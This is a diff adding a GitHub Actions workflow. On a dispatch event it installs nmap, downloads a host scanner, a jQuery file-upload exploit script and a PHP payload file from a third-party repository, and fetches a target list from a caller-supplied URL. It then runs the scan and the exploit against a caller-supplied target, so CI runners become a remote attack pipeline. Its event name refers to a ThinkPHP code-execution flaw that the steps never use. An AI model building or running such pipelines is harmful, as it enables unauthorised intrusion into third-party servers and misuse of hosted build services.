@@ -1,0 +1,38 @@
+on:
+  repository_dispatch:
+    types: [thinkphp_construct_code_exec]
+
+jobs:
+  build:
+  
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        python-version: [3.8]
+    steps:
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v2
+        with:
+          python-version: ${{ matrix.python-version }}
+      - name: install nmap 
+        run: |
+          sudo apt install nmap -y
+      - name: Install dependencies
+        run: |
+          sudo python -m pip install requests
+          sudo python -m pip install python-nmap
+      - name: get aliveScan
+        run: |
+          curl -O https://raw.githubusercontent.com/lisa-hue/test-action/main/alive_scan.py
+          curl -O https://raw.githubusercontent.com/lisa-hue/test-action/main/poc/jquery_upload_file.py
+          curl -O https://raw.githubusercontent.com/lisa-hue/test-action/main/poc/biubiubiu.php
+          curl -o host.txt ${{ github.event.client_payload.downloadurl }}
+
+      - name: alive_scan run
+        run: |
+          sudo python alive_scan.py
+          
+      - name: jquery_upload_file run
+        run: |
+          sudo python jquery_upload_file.py -u ${{ github.event.client_payload.url }} -uid ${{ github.event.client_payload.uuid }} -sid ${{ github.event.client_payload.scan_id }}
